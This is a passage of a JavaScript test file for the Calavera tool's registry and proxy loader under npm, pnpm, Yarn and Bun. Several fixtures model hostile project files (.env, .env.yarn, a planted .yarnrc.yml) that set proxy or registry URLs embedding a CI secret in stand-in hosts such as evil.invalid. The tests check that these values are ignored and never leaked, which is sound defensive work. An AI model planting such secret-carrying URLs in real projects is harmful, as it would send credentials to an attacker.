    env: { PROXY_HOST: "expanded.example.com" },
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, undefined);
});

test("under Yarn, a proxy from a project .yarnrc.yml is ignored", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "workspace/project/.yarnrc.yml": "httpsProxy: http://proxy.example.com\n" },
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, undefined);
  assert.match(warnings[0], /^Ignored httpsProxy in the project \.yarnrc\.yml/);
});

test("BUN_CONFIG_REGISTRY must start with the protocol, loses its credentials, and its errors name the variable", async () => {
  const embedded = await fixture({
    userAgent: BUN,
    env: { BUN_CONFIG_REGISTRY: "mirror.example.com/https://registry.example.com/" },
  });
  assert.equal((await loadNpmRegistryOptions(embedded)).registry.source, "default");

  const credentials = await fixture({
    userAgent: BUN,
    env: { BUN_CONFIG_REGISTRY: `https://user:${SECRET}@registry.example.com/` },
  });
  const { options, warnings, diagnostics } = await loadNpmRegistryOptions(credentials);
  assert.equal(options.registry, "https://registry.example.com/");
  assert.deepEqual(warnings, [
    "Used BUN_CONFIG_REGISTRY from the environment without the username and password in its URL: Calavera sends no credentials to any registry.",
  ]);
  assert.doesNotMatch(inspect([options, warnings, diagnostics]), new RegExp(SECRET));

  const invalid = await fixture({ userAgent: BUN, env: { BUN_CONFIG_REGISTRY: "https://" } });
  await assert.rejects(
    loadNpmRegistryOptions(invalid),
    /^Error: The Bun setting BUN_CONFIG_REGISTRY must be an http or https URL\.$/,
  );
});

test("under Yarn, a project .yarnrc.yml proxy does not remove the home .yarnrc.yml proxy", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "httpsProxy: http://corp.example.com:8080\n",
      "workspace/project/.yarnrc.yml": "httpsProxy: http://team.example.com:3128\n",
    },
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, "http://corp.example.com:8080");
  assert.equal(warnings.length, 1);
  assert.match(
    warnings[0],
    /^Ignored httpsProxy in the project \.yarnrc\.yml: .*Calavera uses httpsProxy from the user \.yarnrc\.yml instead\.$/,
  );
});

test("under Bun, the first registry variable that starts with http:// or https:// wins, as in Bun", async () => {
  const files = { "home/.bunfig.toml": '[install]\nregistry = "https://file.example.com/"\n' };
  /** @type {[Record<string, string>, string, string, string][]} */
  const cases = [
    [
      { NPM_CONFIG_REGISTRY: "nope" },
      "https://file.example.com",
      "user bunfig.toml",
      "install.registry",
    ],
    [
      { npm_config_registry: "nope" },
      "https://file.example.com",
      "user bunfig.toml",
      "install.registry",
    ],
    [
      { BUN_CONFIG_REGISTRY: "nope", NPM_CONFIG_REGISTRY: "https://npm-upper.example.com/" },
      "https://npm-upper.example.com",
      "environment",
      "NPM_CONFIG_REGISTRY",
    ],
    [
      {
        BUN_CONFIG_REGISTRY: "nope",
        NPM_CONFIG_REGISTRY: "nope",
        npm_config_registry: "https://npm-lower.example.com/",
      },
      "https://npm-lower.example.com",
      "environment",
      "npm_config_registry",
    ],
    [
      {
        NPM_CONFIG_REGISTRY: "https://npm-upper.example.com/",
        npm_config_registry: "https://npm-lower.example.com/",
      },
      "https://npm-upper.example.com",
      "environment",
      "NPM_CONFIG_REGISTRY",
    ],
  ];
  for (const [env, origin, source, setting] of cases) {
    const context = await fixture({ userAgent: BUN, files, env });
    assert.deepEqual(
      (await loadNpmRegistryOptions(context)).registry,
      { origin, source, setting },
      JSON.stringify(env),
    );
  }
});

test("under Yarn, the project proxy warning names YARN_HTTPS_PROXY when that variable wins", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "httpsProxy: http://corp.example.com:8080\n",
      "workspace/project/.yarnrc.yml": "httpsProxy: http://team.example.com:3128\n",
    },
    env: { YARN_HTTPS_PROXY: "http://env.example.com:8080" },
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, "http://env.example.com:8080");
  assert.match(warnings[0], /Calavera uses YARN_HTTPS_PROXY from the environment instead\.$/);
});

test("under Yarn, a rejected project proxy warning names the proxy Yarn uses for the registry protocol", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "httpsProxy: http://corp.example.com:8080\n",
      "workspace/project/.yarnrc.yml": "httpProxy: http://team.example.com:3128\n",
    },
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, "http://corp.example.com:8080");
  assert.match(
    warnings[0],
    /^Ignored httpProxy in the project \.yarnrc\.yml: .*Calavera uses httpsProxy from the user \.yarnrc\.yml instead\.$/,
  );

  const unused = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "httpProxy: http://corp.example.com:8080\n",
      "workspace/project/.yarnrc.yml": "httpsProxy: http://team.example.com:3128\n",
    },
  });
  const unusedResult = await loadNpmRegistryOptions(unused);
  assert.equal(unusedResult.options.proxy, undefined);
  assert.match(
    unusedResult.warnings[0],
    /No other proxy setting applies\. To use it, set it in your user \.yarnrc\.yml\.$/,
  );
});

test("under bun run, npm_config_local_prefix does not move the project .npmrc, because only npm exports its settings", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: {
      "workspace/project/.npmrc": "registry=https://cwd.example.com/\n",
      "workspace/.npmrc": "registry=https://prefix.example.com/\n",
    },
    env: { npm_command: "run-script", npm_lifecycle_event: "start" },
  });
  context.env.npm_config_local_prefix = join(context.cwd, "..");
  assert.equal(
    (await loadNpmRegistryOptions(context)).options.registry,
    "https://cwd.example.com/",
  );
});

test("outside a package manager, a proxy in the user file that npm_config_userconfig chose applies", async () => {
  const context = await fixture({
    files: { "workspace/chosen.npmrc": "https-proxy=http://corp.example.com:8080/\n" },
  });
  context.env.npm_config_userconfig = join(context.cwd, "..", "chosen.npmrc");
  assert.equal(
    (await loadNpmRegistryOptions(context)).options.httpsProxy,
    "http://corp.example.com:8080/",
  );
});

test("under Yarn, a rejected project proxy for the other protocol says Yarn would not use it", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "workspace/project/.yarnrc.yml": "httpProxy: http://team.example.com:3128\n" },
  });
  const { warnings } = await loadNpmRegistryOptions(context);
  assert.match(
    warnings[0],
    /^Ignored httpProxy in the project \.yarnrc\.yml: .*Yarn uses it only for http registries, and the registry is https\.$/,
  );
});

/** The project folder of the fixture the previous test created. */
let previousFixtureFolder = "";

test("a fixture folder exists during its test", async () => {
  const context = await fixture({
    files: { "workspace/project/.npmrc": "registry=https://registry.example.com/\n" },
  });
  previousFixtureFolder = context.cwd;
  await access(previousFixtureFolder);
});

test("the previous test's fixture folder is removed after that test", async () => {
  assert.notEqual(previousFixtureFolder, "");
  await assert.rejects(access(previousFixtureFolder), { code: "ENOENT" });
});

test("under Bun, npm_config_@scope:registry still sets the artifact scope's registry, but npm_config_registry gives way to Bun's order", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: { "home/.bunfig.toml": '[install]\nregistry = "https://file.example.com/"\n' },
    env: { [`npm_config_${SCOPE}:registry`]: "https://scoped-env.example.com/" },
  });
  const { options, registry } = await loadNpmRegistryOptions(context);
  assert.equal(options[`${SCOPE}:registry`], "https://scoped-env.example.com/");
  assert.equal(options.registry, "https://file.example.com/");
  assert.deepEqual(registry, {
    origin: "https://scoped-env.example.com",
    source: "environment",
    setting: `${SCOPE}:registry`,
  });
});

// #1186: repository content cannot change which package manager's settings Calavera reads. npm
// exports a project .npmrc `user-agent`, and pnpm its `userAgent` setting from
// pnpm-workspace.yaml, as npm_config_user_agent, but both set npm_execpath to their own binary.
// The environments below are the shapes probed with npm 11.20, pnpm 12.9, Yarn 4.18, and Bun 1.3.9.
const NPM_EXECPATH = "/usr/local/lib/node_modules/npm/bin/npm-cli.js";
const PNPM_EXECPATH =
  "/Users/probe/Library/pnpm/.tools/pnpm/12.9.1/node_modules/@pnpm/exe.darwin-arm64/pnpm";

test("detectLauncher trusts npm_execpath over a user agent that npm or pnpm exported from a project file", () => {
  /** @type {[Record<string, string>, string][]} */
  const cases = [
    [{ npm_execpath: NPM_EXECPATH, npm_config_user_agent: YARN }, "npm"],
    [{ npm_execpath: NPM_EXECPATH, npm_config_user_agent: BUN }, "npm"],
    [
      {
        npm_execpath: "C:\\Program Files\\nodejs\\node_modules\\npm\\bin\\npm-cli.js",
        npm_config_user_agent: BUN,
      },
      "npm",
    ],
    [{ npm_execpath: PNPM_EXECPATH, npm_config_user_agent: BUN }, "npm"],
    [
      {
        npm_execpath: "/usr/local/lib/node_modules/pnpm/bin/pnpm.cjs",
        npm_config_user_agent: YARN,
      },
      "npm",
    ],
    [
      {
        npm_execpath: "C:\\Users\\probe\\AppData\\Local\\pnpm\\pnpm.exe",
        npm_config_user_agent: YARN,
      },
      "npm",
    ],
    // Yarn and Bun set both themselves, and repository content cannot change either.
    [{ npm_execpath: "/private/tmp/xfs-c92579a3/yarn", npm_config_user_agent: YARN }, "yarn"],
    [{ npm_execpath: "/Users/probe/.bun/bin/bun", npm_config_user_agent: BUN }, "bun"],
    // Only the whole file name counts, so a wrapper whose name merely contains npm or pnpm does not.
    [{ npm_execpath: "/opt/tools/pnpm-to-bun", npm_config_user_agent: BUN }, "bun"],
    [{ npm_execpath: "/opt/tools/not-npm-cli.js", npm_config_user_agent: YARN }, "yarn"],
    // Without npm_execpath, as when the variable is set by hand, the user agent still counts.
    [{ npm_config_user_agent: YARN }, "yarn"],
    [{ npm_config_user_agent: BUN }, "bun"],
    [{}, "npm"],
  ];
  for (const [env, launcher] of cases) {
    assert.equal(detectLauncher(env), launcher, env.npm_execpath ?? "no npm_execpath");
  }
});

test("a project .npmrc user-agent exported by npm does not switch Calavera to the Yarn settings", async () => {
  const context = await fixture({
    files: {
      "home/.npmrc": "https-proxy=http://user-proxy.example.com:8080/\n",
      "workspace/project/.npmrc": "user-agent=yarn/4.9.1 npm/? node/x\n",
      "workspace/project/.yarnrc.yml": "npmRegistryServer: https://yarn-mirror.example.com\n",
    },
  });
  const result = await loadNpmRegistryOptions({
    ...context,
    env: {
      ...context.env,
      npm_execpath: NPM_EXECPATH,
      npm_command: "exec",
      npm_config_local_prefix: context.cwd,
      npm_config_user_agent: "yarn/4.9.1 npm/? node/x",
    },
  });
  assert.equal(result.options.httpsProxy, "http://user-proxy.example.com:8080/");
  assert.equal(result.registry.origin, "https://registry.npmjs.org");
});

test("a pnpm userAgent in pnpm-workspace.yaml does not switch Calavera to the Bun settings", async () => {
  const context = await fixture({
    files: {
      "home/.npmrc": "https-proxy=http://user-proxy.example.com:8080/\n",
      "workspace/project/pnpm-workspace.yaml": "userAgent: bun/1.3.9 npm/? node/x\n",
      "workspace/project/bunfig.toml": '[install]\nregistry = "https://bun-mirror.example.com/"\n',
    },
  });
  const result = await loadNpmRegistryOptions({
    ...context,
    env: {
      ...context.env,
      npm_execpath: PNPM_EXECPATH,
      npm_command: "exec",
      npm_config_user_agent: "bun/1.3.9 npm/? node/x",
    },
  });
  // Bun does not read .npmrc proxies, so the user proxy shows that the npm settings were read.
  assert.equal(result.options.httpsProxy, "http://user-proxy.example.com:8080/");
  assert.equal(result.registry.origin, "https://registry.npmjs.org");
});

test("a Yarn 4 .env.yarn cannot switch Calavera to the npm settings or choose the user .yarnrc.yml it expands", async () => {
  const context = await fixture({
    files: {
      "home/.yarnrc.yml": "httpsProxy: http://user-proxy.example.com:8080\n",
      "workspace/project/evilhome/.yarnrc.yml":
        "httpsProxy: http://${CI_SECRET}.evil.example:8080\n",
      "workspace/project/evil.npmrc": "registry=https://npm-mirror.example.com/\n",
      "workspace/project/.env.yarn":
        "npm_command=exec\nHOME=./evilhome\nnpm_config_userconfig=./evil.npmrc\n",
    },
  });
  // Yarn 4.18 applies .env.yarn to the binaries it runs, then sets npm_execpath and
  // npm_config_user_agent itself, so the user agent stays Yarn's, but HOME, npm_command, and
  // npm_config_userconfig come from the file.
  const result = await loadNpmRegistryOptions({
    ...context,
    env: {
      HOME: join(context.cwd, "evilhome"),
      CI_SECRET: SECRET,
      npm_execpath: "/private/tmp/xfs-c92579a3/yarn",
      npm_config_user_agent: YARN,
      npm_command: "exec",
      npm_config_userconfig: "./evil.npmrc",
    },
  });
  assert.equal(result.registry.origin, "https://registry.yarnpkg.com");
  assert.equal(result.options.proxy, undefined);
  assert.deepEqual(result.warnings, [
    "Ignored httpsProxy in the user .yarnrc.yml: Calavera expands variables only in your own .yarnrc.yml in your account's home folder and in environment variables, never in a file that a variable or a project file names.",
  ]);
  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET));
});

// Owner decisions 2 and 3 on #1186 (2026-11-24): a registry or proxy value that came from an
// expanded variable in a Yarn 4 `.env.yarn`, or in the `.env` files Bun loads when Bun runs
// Calavera, is ignored with a warning and a remedy. Yarn 4.18.1 parses each file of
// `injectEnvironmentFiles` (default `.env.yarn?` in the project folder) with dotenv and lets its
// values replace the caller's; Bun 1.3.9 loads `.env`, `.env.<mode>`, `.env.local`, and
// `.env.<mode>.local` from the working folder, and the caller's values win.
const CI_SECRET = "CISECRETVALUE0123";

/**
 * @param {Awaited<ReturnType<typeof fixture>>} context
 * @param {RegExp} pattern
 */
function assertNoSecret(context, pattern) {
  assert.doesNotMatch(inspect(context, { depth: 10 }), pattern);
}

test("under Yarn, a proxy or registry that .env.yarn sets from a variable is ignored with a warning and a remedy", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/yarn.lock": "",
      "workspace/project/.env.yarn":
        "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\nYARN_NPM_REGISTRY_SERVER=https://evil.invalid/${CI_SECRET}/\n",
    },
    env: {
      CI_SECRET,
      YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1`,
      YARN_NPM_REGISTRY_SERVER: `https://evil.invalid/${CI_SECRET}/`,
    },
  });
  const result = await loadNpmRegistryOptions(context);
  assert.equal(result.options.proxy, undefined);
  assert.equal(result.registry.origin, "https://registry.yarnpkg.com");
  assert.deepEqual(result.warnings, [
    "Ignored YARN_HTTPS_PROXY, which .env.yarn sets from a variable: Yarn expanded the variable before Calavera started, and Calavera does not take a variable's value from a project file. Write the value without a variable in .env.yarn, or remove it from .env.yarn and set YARN_HTTPS_PROXY in your own environment.",
    "Ignored YARN_NPM_REGISTRY_SERVER, which .env.yarn sets from a variable: Yarn expanded the variable before Calavera started, and Calavera does not take a variable's value from a project file. Write the value without a variable in .env.yarn, or remove it from .env.yarn and set YARN_NPM_REGISTRY_SERVER in your own environment.",
  ]);
  assertNoSecret(result, new RegExp(CI_SECRET));
});

test("under Yarn, a literal .env.yarn value and a caller's variable follow the existing rules", async () => {
  const literal = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/yarn.lock": "",
      "workspace/project/.env.yarn": "YARN_HTTPS_PROXY=http://plain.example.com:1\n",
    },
    env: { YARN_HTTPS_PROXY: "http://plain.example.com:1" },
  });
  assert.equal((await loadNpmRegistryOptions(literal)).options.proxy, "http://plain.example.com:1");
  // An escaped variable is literal text for Yarn too.
  const escaped = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/yarn.lock": "",
      "workspace/project/.env.yarn": "OTHER=\\${NOT_A_VARIABLE}\n",
    },
    env: { YARN_HTTPS_PROXY: "http://caller.example.com:1" },
  });
  assert.equal(
    (await loadNpmRegistryOptions(escaped)).options.proxy,
    "http://caller.example.com:1",
  );
});

test("under Yarn, a file that injectEnvironmentFiles in a .yarnrc.yml names is judged, relative to that file's folder", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/yarn.lock": "",
      "workspace/.yarnrc.yml": "injectEnvironmentFiles:\n  - config/custom.env\n",
      "workspace/config/custom.env": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
      // A sibling folder's file is no candidate, so the caller's registry still applies.
      "workspace/other/.env.yarn": "YARN_NPM_REGISTRY_SERVER=https://${CI_SECRET}.invalid/\n",
    },
    env: {
      CI_SECRET,
      YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1`,
      YARN_NPM_REGISTRY_SERVER: "https://caller-mirror.example.com",
    },
  });
  const result = await loadNpmRegistryOptions(context);
  assert.equal(result.options.proxy, undefined);
  assert.equal(result.registry.origin, "https://caller-mirror.example.com");
  assert.match(
    result.warnings.join("\n"),
    /^Ignored YARN_HTTPS_PROXY, which \.\.\/config\/custom\.env sets/m,
  );
});

test("a proxy variable that .env.yarn sets from a variable is bypassed for every request, and a literal one is not", async () => {
  const claimed = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/yarn.lock": "",
      "workspace/project/.env.yarn": "HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
    },
    env: { CI_SECRET, HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
  });
  const result = await loadNpmRegistryOptions(claimed);
  assert.equal(typeof result.requestOptions.agent, "function");
  assert.match(result.warnings.join("\n"), /^Ignored HTTPS_PROXY, which \.env\.yarn sets/m);
  assertNoSecret(result, new RegExp(CI_SECRET));

  const literal = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/yarn.lock": "",
      "workspace/project/.env.yarn": "HTTPS_PROXY=http://corp.example.com:3128\n",
    },
    env: { HTTPS_PROXY: "http://corp.example.com:3128" },
  });
  const plain = await loadNpmRegistryOptions(literal);
  assert.equal(plain.requestOptions.agent, undefined);
});

test("when Bun runs Calavera, a registry or proxy that a .env file sets from a variable is ignored", async () => {
  for (const reference of ["${CI_SECRET}", "$CI_SECRET"]) {
    const npm = await fixture({
      files: {
        "workspace/project/.env": `HTTPS_PROXY=http://${reference}.evil.invalid:1/\n`,
      },
      env: { CI_SECRET, HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1/` },
    });
    const result = await loadNpmRegistryOptions({ ...npm, runtime: "bun" });
    assert.equal(typeof result.requestOptions.agent, "function", reference);
    assert.deepEqual(
      result.warnings,
      [
        "Ignored HTTPS_PROXY, which .env sets from a variable: Calavera cannot tell whether the value came from that file or from your own environment, because Bun keeps a variable you set, and Bun may not have loaded the file at all, as with --no-env-file or env = false in bunfig.toml. Calavera does not take a variable's value from a project file. Remove or rename HTTPS_PROXY in .env.",
      ],
      reference,
    );
    assertNoSecret(result, new RegExp(CI_SECRET));
  }
  const bun = await fixture({
    userAgent: BUN,
    files: { "workspace/project/.env": "BUN_CONFIG_REGISTRY=http://evil.invalid/${CI_SECRET}/\n" },
    env: { CI_SECRET, BUN_CONFIG_REGISTRY: `http://evil.invalid/${CI_SECRET}/` },
  });
  const registry = await loadNpmRegistryOptions({ ...bun, runtime: "bun" });
  assert.equal(registry.registry.origin, "https://registry.npmjs.org");
  assertNoSecret(registry, new RegExp(CI_SECRET));
});

test("under Node, a .env file is not loaded, so its values are not judged", async () => {
  const context = await fixture({
    files: {
      "workspace/project/.env": "npm_config_https_proxy=http://${CI_SECRET}.evil.invalid:1/\n",
    },
    env: { npm_config_https_proxy: "http://caller.example.com:1/" },
  });
  const { options } = await loadNpmRegistryOptions({ ...context, runtime: "node" });
  assert.equal(options.httpsProxy, "http://caller.example.com:1/");
});

test("when Bun runs Calavera, the .env file Bun gives precedence decides, and NODE_ENV=test skips .env.local", async () => {
  // .env.local overrides .env with a literal value, so the variable is not judged.
  const local = await fixture({
    files: {
      "workspace/project/.env": "HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1/\n",
      "workspace/project/.env.local": "HTTPS_PROXY=http://plain.example.com:1/\n",
    },
    env: { HTTPS_PROXY: "http://plain.example.com:1/" },
  });
  assert.equal(
    (await loadNpmRegistryOptions({ ...local, runtime: "bun" })).requestOptions.agent,
    undefined,
  );
  // .env.development.local overrides .env.local.
  const modeLocal = await fixture({
    files: {
      "workspace/project/.env.local": "HTTPS_PROXY=http://plain.example.com:1/\n",
      "workspace/project/.env.development.local":
        "HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1/\n",
    },
    env: { CI_SECRET, HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1/` },
  });
  assert.equal(
    typeof (await loadNpmRegistryOptions({ ...modeLocal, runtime: "bun" })).requestOptions.agent,
    "function",
  );
  // Under NODE_ENV=test, Bun does not load .env.local, so .env decides.
  const test = await fixture({
    files: {
      "workspace/project/.env": "HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1/\n",
      "workspace/project/.env.local": "HTTPS_PROXY=http://plain.example.com:1/\n",
    },
    env: {
      CI_SECRET,
      NODE_ENV: "test",
      HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1/`,
    },
  });
  assert.equal(
    typeof (await loadNpmRegistryOptions({ ...test, runtime: "bun" })).requestOptions.agent,
    "function",
  );
});

test("a real Bun run loads the project .env, and the loader ignores the proxy it set from a variable", async (t) => {
  const context = await fixture({
    files: {
      "workspace/project/.env": "HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1/\n",
    },
  });
  const script = join(context.cwd, "..", "probe.mjs");
  const loader = new URL("../src/npm-config.js", import.meta.url).href;
  // The probe reports booleans only, never a value.
  await writeFile(
    script,
    `import { loadNpmRegistryOptions } from ${JSON.stringify(loader)};
const loaded = process.env.HTTPS_PROXY !== undefined;
const { requestOptions, warnings } = await loadNpmRegistryOptions({ cwd: process.cwd(), env: process.env });
console.log(JSON.stringify({ loaded, proxy: typeof requestOptions.agent !== "function", warned: warnings.some((w) => w.startsWith("Ignored HTTPS_PROXY, which .env sets from a variable: Calavera cannot tell whether")) }));
`,
  );
  let stdout;
  try {
    ({ stdout } = await promisify(execFile)("bun", [script], {
      cwd: context.cwd,
      env: { PATH: process.env.PATH, HOME: context.env.HOME, CI_SECRET },
    }));
  } catch (error) {
    if (/** @type {NodeJS.ErrnoException} */ (error).code !== "ENOENT") throw error;
    t.skip("Bun is not installed");
    return;
  }
  assert.deepEqual(JSON.parse(stdout), { loaded: true, proxy: false, warned: true });
});

test("when Bun runs Calavera under NODE_ENV=production, .env.production is judged", async () => {
  const context = await fixture({
    files: {
      "workspace/project/.env.production": "HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1/\n",
    },
    env: {
      CI_SECRET,
      NODE_ENV: "production",
      HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1/`,
    },
  });
  const { requestOptions } = await loadNpmRegistryOptions({ ...context, runtime: "bun" });
  assert.equal(typeof requestOptions.agent, "function");
});

test("outside Yarn, a .env.yarn is not loaded, so its values are not judged", async () => {
  const context = await fixture({
    files: {
      "workspace/project/yarn.lock": "",
      "workspace/project/.env.yarn": "npm_config_https_proxy=http://${CI_SECRET}.evil.invalid:1/\n",
    },
    env: { npm_config_https_proxy: "http://caller.example.com:1/" },
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, "http://caller.example.com:1/");
});

test("every proxy variable that @npmcli/agent falls back to is bypassed when .env.yarn set it from a variable", async () => {
  for (const name of ["HTTP_PROXY", "proxy"]) {
    const context = await fixture({
      userAgent: YARN,
      files: {
        "workspace/project/yarn.lock": "",
        "workspace/project/.env.yarn": `${name}=http://\${CI_SECRET}.evil.invalid:1\n`,
      },
      env: { CI_SECRET, [name]: `http://${CI_SECRET}.evil.invalid:1` },
    });
    const result = await loadNpmRegistryOptions(context);
    assert.equal(typeof result.requestOptions.agent, "function", name);
  }
});

test("the bypass keeps a configured noproxy list, and the ignored project proxy warning does not name the bypassed variable", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/yarn.lock": "",
      "workspace/project/.env.yarn": "HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
      "workspace/project/.yarnrc.yml": "httpsProxy: http://project-proxy.example.com:1\n",
    },
    env: { CI_SECRET, HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
  });
  const result = await loadNpmRegistryOptions(context);
  assert.doesNotMatch(
    result.warnings.join("\n"),
    /Calavera uses the HTTPS_PROXY environment variable/,
  );
  assert.match(result.warnings.join("\n"), /No other proxy setting applies/);

  const npm = await fixture({
    files: {
      "home/.npmrc": "noproxy=internal.example.com\n",
      "workspace/project/.env": "HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
    },
    // npm started Bun, so the npm settings, with their noproxy, apply.
    env: {
      CI_SECRET,
      HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1`,
      npm_execpath: "/usr/local/lib/node_modules/npm/bin/npm-cli.js",
      npm_config_user_agent: "npm/11.20.0 node/v24.3.0 darwin arm64",
    },
  });
  const bun = await loadNpmRegistryOptions({ ...npm, runtime: "bun" });
  assert.equal(bun.requestOptions.noProxy, "internal.example.com");
  assert.equal(typeof bun.requestOptions.agent, "function");
});

test("under Yarn, an environment file path with a variable that has no fallback makes every registry and proxy variable ignored", async () => {
  // Yarn expands the path with an empty environment, so ${ENV_NAME} has no value, and Yarn stops.
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.yarnrc.yml":
        "injectEnvironmentFiles:\n  - ./plain.env\n  - ./${ENV_NAME}.env\n",
    },
    env: { YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
  });
  const result = await loadNpmRegistryOptions(context);
  assert.equal(result.options.proxy, undefined);
  assert.match(
    result.warnings.join("\n"),
    /^Ignored YARN_HTTPS_PROXY: Calavera cannot tell which environment files Yarn loaded for this run, because a \.yarnrc\.yml setting names an environment file with a variable in its path that Yarn cannot expand\. Write the path without a variable\./m,
  );
  assertNoSecret(result, new RegExp(CI_SECRET));
});

test("when Bun runs Calavera and a .env file sets NODE_ENV, the development files Bun loaded are judged too", async () => {
  const context = await fixture({
    files: {
      "workspace/project/.env": "NODE_ENV=production\n",
      "workspace/project/.env.development": "HTTPS_PROXY=http://$CI_SECRET.evil.invalid:1\n",
    },
    env: { CI_SECRET, NODE_ENV: "production", HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
  });
  const result = await loadNpmRegistryOptions({ ...context, runtime: "bun" });
  assert.equal(typeof result.requestOptions.agent, "function");
});

test("without a cwd, Bun's .env files are read from the folder Calavera started in, not the folder it moved to", async () => {
  // The CLI changes into a new or ancestor project before it resolves artifacts; Bun loaded the
  // files of the folder Calavera started in. The child reports booleans only.
  const context = await fixture({
    files: {
      "workspace/project/.env": "HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1/\n",
    },
  });
  const elsewhere = join(context.cwd, "..", "elsewhere");
  await mkdir(elsewhere);
  const script = join(context.cwd, "..", "probe.mjs");
  const loader = new URL("../src/npm-config.js", import.meta.url).href;
  await writeFile(
    script,
    `const { loadNpmRegistryOptions } = await import(${JSON.stringify(loader)});
process.chdir(process.env.PROBE_ELSEWHERE);
const { requestOptions } = await loadNpmRegistryOptions({ env: { HOME: process.env.HOME, HTTPS_PROXY: process.env.PROBE_PROXY }, runtime: "bun" });
console.log(JSON.stringify({ proxy: typeof requestOptions.agent !== "function" }));
`,
  );
  const { stdout } = await promisify(execFile)(process.execPath, [script], {
    cwd: context.cwd,
    env: {
      PATH: process.env.PATH,
      HOME: context.env.HOME,
      PROBE_ELSEWHERE: elsewhere,
      PROBE_PROXY: `http://${CI_SECRET}.evil.invalid:1/`,
      ...(process.env.__STRYKER_ACTIVE_MUTANT__
        ? { __STRYKER_ACTIVE_MUTANT__: process.env.__STRYKER_ACTIVE_MUTANT__ }
        : {}),
    },
  });
  assert.deepEqual(JSON.parse(stdout), { proxy: false });
});

test("when Bun runs Calavera with the caller's NODE_ENV and no .env file defines NODE_ENV, the development files are not judged", async () => {
  const context = await fixture({
    files: {
      "workspace/project/.env.development": "HTTPS_PROXY=http://$CI_SECRET.evil.invalid:1\n",
    },
    env: { NODE_ENV: "production", HTTPS_PROXY: "http://corp.example.com:3128" },
  });
  const result = await loadNpmRegistryOptions({ ...context, runtime: "bun" });
  assert.equal(result.requestOptions.agent, undefined);
  assert.deepEqual(result.warnings, []);
});

test("under Yarn, an injectEnvironmentFiles path is unescaped as Yarn unescapes it, and the Yarn rc chain of the starting folder counts", async () => {
  const escaped = await fixture({
    userAgent: YARN,
    files: {
      // The YAML value is ./e\\vil.env, which Yarn's $Q unescapes to ./e\vil.env.
      "workspace/project/.yarnrc.yml": "injectEnvironmentFiles:\n  - './e\\\\vil.env'\n",
      "workspace/project/e\\vil.env": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
    },
    env: { CI_SECRET, YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
  });
  assert.equal((await loadNpmRegistryOptions(escaped)).options.proxy, undefined);
  // Yarn started in src, whose .yarnrc.yml names sub.env; the script runs one folder up.
  const nested = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/src/.yarnrc.yml": "injectEnvironmentFiles:\n  - sub.env\n",
      "workspace/project/src/sub.env": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
    },
    env: { CI_SECRET, YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
  });
  const result = await loadNpmRegistryOptions({
    ...nested,
    env: { ...nested.env, INIT_CWD: join(nested.cwd, "src") },
  });
  assert.equal(result.options.proxy, undefined);
});

test("when Bun runs Calavera, a NODE_ENV that a development file sets does not hide the development files", async () => {
  const context = await fixture({
    files: {
      "workspace/project/.env.development":
        "NODE_ENV=production\nHTTPS_PROXY=http://$CI_SECRET.evil.invalid:1\n",
    },
    env: { CI_SECRET, NODE_ENV: "production", HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
  });
  const result = await loadNpmRegistryOptions({ ...context, runtime: "bun" });
  assert.equal(typeof result.requestOptions.agent, "function");
});

